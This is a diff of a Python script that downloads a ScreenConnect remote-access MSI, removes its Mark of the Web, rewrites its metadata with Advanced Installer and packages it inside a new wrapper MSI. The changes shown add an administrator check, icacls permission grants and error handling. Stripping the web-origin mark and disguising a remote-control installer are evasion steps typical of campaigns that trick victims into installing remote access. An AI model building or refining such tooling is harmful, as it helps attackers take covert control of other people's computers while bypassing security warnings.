@@ -3,18 +3,25 @@ import requests
 import hashlib
 import subprocess
 import shutil
-import win32com.client
 import time
 import random
 import string
 import uuid
+import ctypes
 from urllib.parse import urlparse
 from datetime import datetime
 
 # Configuration
 MSI_URL = input("Enter the ScreenConnect client MSI download link: ")
-OUTPUT_DIR = "output"
+OUTPUT_DIR = os.path.join(os.path.expanduser("~"), "Documents", "output")  # Use user-writable directory
 ADVANCED_INSTALLER_PATH = os.getenv("ADVINST_COM", r"C:\Program Files (x86)\Caphyon\Advanced Installer 22.9.1\bin\x86\AdvancedInstaller.com")
+
+def is_admin():
+    """Check if the script is running with administrative privileges."""
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
 
 def generate_random_string(length=10):
     """Generate a random string for temporary file naming."""
@@ -43,7 +50,9 @@ def sanitize_filename(url):
 def download_msi(url, output_dir):
     """Download the MSI file and return its path."""
     if not os.path.exists(output_dir):
-        os.makedirs(output_dir)
+        os.makedirs(output_dir, exist_ok=True)
+        # Set write permissions
+        subprocess.run(["icacls", output_dir, "/grant", f"{os.getlogin()}:F"], check=True)
     
     original_filename = sanitize_filename(url)
     output_path = os.path.join(output_dir, original_filename)
@@ -57,7 +66,7 @@ def download_msi(url, output_dir):
         # Verify MSI file (basic check for MSI magic number)
         with open(output_path, 'rb') as f:
             magic = f.read(8)
-            if not magic.startswith(b'\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1'):  # CFB signature for MSI
+            if not magic.startswith(b'\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1'):
                 raise ValueError(f"Downloaded file {output_path} is not a valid MSI")
         print(f"MSI downloaded to {output_path}")
         return output_path, original_filename
@@ -65,18 +74,24 @@ def download_msi(url, output_dir):
         raise Exception(f"Failed to download MSI. Status code: {response.status_code}")
 
 def remove_motw(file_path):
-    """Remove the Mark of the Web (Alternate Data Stream) from the file."""
+    """Remove the Mark of the Web using PowerShell."""
     try:
         print(f"Removing Mark of the Web from {file_path}...")
-        shell = win32com.client.Dispatch("Shell.Application")
-        folder = shell.NameSpace(os.path.dirname(file_path))
-        item = folder.ParseName(os.path.basename(file_path))
-        streams = subprocess.run(["powershell", "-Command", f"Get-Item -Path '{file_path}' -Stream *"], capture_output=True, text=True)
+        # Check for Zone.Identifier stream
+        streams = subprocess.run(
+            ["powershell", "-Command", f"Get-Item -Path '{file_path}' -Stream *"],
+            capture_output=True, text=True, check=True
+        )
         if ":Zone.Identifier" in streams.stdout:
-            subprocess.run(["powershell", "-Command", f"Unblock-File -Path '{file_path}'"])
+            subprocess.run(
+                ["powershell", "-Command", f"Unblock-File -Path '{file_path}'"],
+                check=True
+            )
             print("Mark of the Web removed.")
         else:
             print("No Mark of the Web found.")
+    except subprocess.CalledProcessError as e:
+        print(f"Error removing MotW: {e.stderr}")
     except Exception as e:
         print(f"Error removing MotW: {e}")
 
@@ -84,8 +99,14 @@ def modify_msi_metadata(file_path, temp_dir):
     """Modify MSI metadata using Advanced Installer's CLI."""
     print(f"Modifying MSI metadata for {file_path}...")
     try:
+        if not os.path.exists(temp_dir):
+            os.makedirs(temp_dir, exist_ok=True)
+            subprocess.run(["icacls", temp_dir, "/grant", f"{os.getlogin()}:F"], check=True)
+        
         modified_path = os.path.join(temp_dir, os.path.basename(file_path))
         shutil.copyfile(file_path, modified_path)
+        # Set write permissions for modified_path
+        subprocess.run(["icacls", modified_path, "/grant", f"{os.getlogin()}:F"], check=True)
         
         # Create an Advanced Installer project file (.aip) for metadata editing
         aip_path = os.path.join(temp_dir, "modify_metadata.aip")
@@ -107,18 +128,21 @@ def modify_msi_metadata(file_path, temp_dir):
     </SUMMARY_INFO>
 </PROJECT>''')
         
+        # Set write permissions for aip_path
+        subprocess.run(["icacls", aip_path, "/grant", f"{os.getlogin()}:F"], check=True)
+        
         # Use Advanced Installer CLI to import and modify MSI
         cmd = [
             ADVANCED_INSTALLER_PATH,
             "/edit", modified_path,
             "/LoadProject", aip_path
         ]
-        result = subprocess.run(cmd, capture_output=True, text=True)
-        if result.returncode != 0:
-            raise Exception(f"Failed to modify MSI metadata: {result.stderr}")
-        
+        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
         print("MSI metadata modified.")
         return modified_path
+    except subprocess.CalledProcessError as e:
+        print(f"Error modifying MSI metadata: {e.stderr}")
+        raise
     except Exception as e:
         print(f"Error modifying MSI metadata: {e}")
         raise
@@ -173,15 +197,16 @@ def create_msi_wrapper(msi_path, output_dir, original_filename):
     </CUSTOM_ACTIONS>
 </PROJECT>''')
         
+        # Set write permissions for aip_path
+        subprocess.run(["icacls", aip_path, "/grant", f"{os.getlogin()}:F"], check=True)
+        
         # Use Advanced Installer CLI to create the wrapper MSI
         cmd = [
             ADVANCED_INSTALLER_PATH,
             "/newproject", aip_path,
             "/build"
         ]
-        result = subprocess.run(cmd, capture_output=True, text=True)
-        if result.returncode != 0:
-            raise Exception(f"Failed to create MSI wrapper: {result.stderr}")
+        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
         
         # The output MSI is typically in the same directory as the .aip file
         generated_msi = os.path.join(output_dir, "ScreenConnect Remote Access.msi")
@@ -192,6 +217,9 @@ def create_msi_wrapper(msi_path, output_dir, original_filename):
         
         print(f"MSI wrapper created at {wrapper_msi_path}")
         return wrapper_msi_path
+    except subprocess.CalledProcessError as e:
+        print(f"Error creating MSI wrapper: {e.stderr}")
+        raise
     except Exception as e:
         print(f"Error creating MSI wrapper: {e}")
         raise
@@ -201,11 +229,16 @@ def create_msi_wrapper(msi_path, output_dir, original_filename):
             os.remove(aip_path)
 
 def main():
+    # Check for administrative privileges
+    if not is_admin():
+        raise PermissionError("This script must be run as an administrator.")
+    
     try:
         # Create temporary directory
         temp_dir = os.path.join(OUTPUT_DIR, "temp")
         if not os.path.exists(temp_dir):
-            os.makedirs(temp_dir)
+            os.makedirs(temp_dir, exist_ok=True)
+            subprocess.run(["icacls", temp_dir, "/grant", f"{os.getlogin()}:F"], check=True)
         
         # Step 1: Download MSI
         msi_path, original_filename = download_msi(MSI_URL, OUTPUT_DIR)
